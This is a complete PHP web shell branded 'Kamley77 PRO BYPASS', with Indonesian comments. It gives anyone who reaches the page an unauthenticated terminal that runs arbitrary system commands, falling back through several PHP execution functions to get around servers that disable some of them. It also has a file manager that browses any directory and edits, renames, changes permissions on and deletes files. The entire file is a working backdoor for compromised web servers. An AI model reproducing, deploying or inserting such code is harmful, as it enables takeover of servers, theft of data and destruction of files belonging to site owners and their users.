<?php
// Navigasi & Branding
$dir = isset($_GET['d']) ? str_replace('\\', '/', $_GET['d']) : str_replace('\\', '/', getcwd());
if (!is_dir($dir)) $dir = str_replace('\\', '/', getcwd());
chdir($dir);
$real_path = str_replace('\\', '/', getcwd());

echo "<div style='text-align: center; font-family: monospace; background: #222; color: #0f0; padding: 10px;'>";
echo "<h1>Kamley77 PRO BYPASS - TERMINAL</h1>";
echo "<b>Path: </b>";
$parts = explode('/', trim($real_path, '/'));
$path_build = "";
echo "<a href='?d=/' style='color:#0f0;'>/</a>"; 
foreach ($parts as $part) {
    if (empty($part)) continue;
    $path_build .= "/" . $part; 
    echo "<a href='?d=$path_build' style='color:#0f0; text-decoration:none;'>$part</a> / ";
}
echo "</div>";

// --- TERMINAL BYPASS ENGINE ---
function bypass_exec($cmd) {
    $out = "";
    if (function_exists('shell_exec')) { $out = shell_exec($cmd . " 2>&1"); }
    elseif (function_exists('system')) { ob_start(); system($cmd . " 2>&1"); $out = ob_get_contents(); ob_end_clean(); }
    elseif (function_exists('passthru')) { ob_start(); passthru($cmd . " 2>&1"); $out = ob_get_contents(); ob_end_clean(); }
    elseif (function_exists('exec')) { exec($cmd . " 2>&1", $output); $out = implode("\n", $output); }
    elseif (is_resource($h = popen($cmd . " 2>&1", 'r'))) { while (!feof($h)) { $out .= fread($h, 2048); } pclose($h); }
    return $out ? $out : "[!] Semua fungsi eksekusi (shell_exec, system, dll) di-disable oleh server.";
}

// UI Terminal
echo '<div style="background: #000; color: #0f0; padding: 15px; font-family: Courier New;">';
echo '<form method="POST">
        <span style="color: #fff;">kamley77@bypass:~$</span> 
        <input type="text" name="cmd" autofocus style="background:transparent; border:none; color:#0f0; width:70%; outline:none;" placeholder="masukkan perintah...">
        <input type="submit" value="Enter" style="display:none;">
      </form>';

if (isset($_POST['cmd'])) {
    echo "<div style='margin-top: 10px; border-top: 1px dashed #333; padding-top: 10px;'>";
    echo "<b style='color: yellow;'>Output:</b><br>";
    echo "<pre style='white-space: pre-wrap;'>" . htmlspecialchars(bypass_exec($_POST['cmd'])) . "</pre>";
    echo "</div>";
}
echo '</div>';

// --- FILE MANAGER LOGIC (Edit, Rename, Chmod) ---
if (isset($_POST['save_file'])) { file_put_contents($_POST['filepath'], $_POST['content']); }
if (isset($_POST['rename_obj'])) { rename($_POST['old_name'], $_POST['new_name']); header("Location: ?d=$real_path"); }
if (isset($_POST['change_perm'])) { chmod($_POST['obj_path'], octdec($_POST['perm_value'])); header("Location: ?d=$real_path"); }

// Area Edit File
if (isset($_GET['edit'])) {
    $file_to_edit = $_GET['edit'];
    $content = htmlspecialchars(@file_get_contents($file_to_edit));
    echo "<div style='padding: 20px; background: #f4f4f4;'><h3>Edit: ".basename($file_to_edit)."</h3>
    <form method='POST'>
        <input type='hidden' name='filepath' value='$file_to_edit'>
        <textarea name='content' style='width:100%; height:200px;'>$content</textarea><br>
        <input type='submit' name='save_file' value='Save'> <a href='?d=$real_path'>Cancel</a>
    </form></div>";
}

// Tabel File Manager
echo "<table border='1' width='100%' style='font-family: monospace; border-collapse: collapse; margin-top: 20px;'>
    <tr style='background: #333; color: #fff;'><th>Nama</th><th>Perms</th><th>Aksi</th></tr>";

$files = scandir($dir);
foreach ($files as $file) {
    if ($file == "." || $file == "..") continue;
    $full_path = $real_path . '/' . $file;
    $is_dir = is_dir($full_path);
    $writable = is_writable($full_path);
    $perms = substr(sprintf('%o', fileperms($full_path)), -4);

    echo "<tr>
        <td>" . ($is_dir ? "<b><a href='?d=$full_path'>[$file]</a></b>" : $file) . "</td>
        <td style='color: " . ($writable ? "green" : "red") . "; font-weight: bold;'>
            <form method='POST' style='display:inline;'>
                <input type='hidden' name='obj_path' value='$full_path'>
                <input type='text' name='perm_value' value='$perms' size='4' style='border:none; text-align:center;'>
                <input type='submit' name='change_perm' value='ok' style='font-size:9px;'>
            </form>
        </td>
        <td>
            <a href='?d=$real_path&edit=$full_path'>Edit</a> | 
            <form method='POST' style='display:inline;'>
                <input type='hidden' name='old_name' value='$full_path'>
                <input type='text' name='new_name' placeholder='rename' size='7'>
                <input type='submit' name='rename_obj' value='>>' style='font-size:9px;'>
            </form> | 
            <a href='?delete=$full_path' style='color:red;'>X</a>
        </td>
    </tr>";
}
echo "</table>";

if (isset($_GET['delete'])) { @unlink($_GET['delete']); @rmdir($_GET['delete']); header("Location: ?d=$real_path"); }
?>
